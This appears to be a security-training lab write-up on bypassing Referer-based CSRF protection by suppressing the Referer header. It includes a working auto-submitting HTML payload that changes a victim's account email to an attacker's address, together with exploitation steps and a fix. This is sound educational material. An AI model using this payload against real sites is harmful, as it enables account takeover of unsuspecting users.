# Lab 11: CSRF Where Referer Validation Depends on Header Being Present
**Difficulty:** Practitioner  
**Status:** ✅ Solved

## Vulnerability
Server validates Referer if present.
But if Referer is missing entirely → request accepted.
Insecure fallback — no Referer means no validation.

## Payload
```
<meta name="referrer" content="no-referrer">

<form method="POST" action="https://TARGET/my-account/change-email">
    <input type="hidden" name="email" value="attacker@gmail.com">
</form>
<script>
    document.forms[0].submit();
</script>
```

## Steps
1. Intercepted email change request in Burp
2. Changed Referer domain → rejected
3. Deleted Referer header entirely → 200 OK!
4. Added meta referrer no-referrer tag to suppress Referer
5. Delivered to victim → solved

## Why It Works
Server logic: if Referer exists → validate it.
If Referer missing → skip validation entirely.
meta referrer tag tells browser not to send Referer.
No Referer = no check = bypass.

## Fix
If Referer is missing → block the request.
Treat missing Referer same as invalid Referer.
Better: use proper CSRF tokens instead.
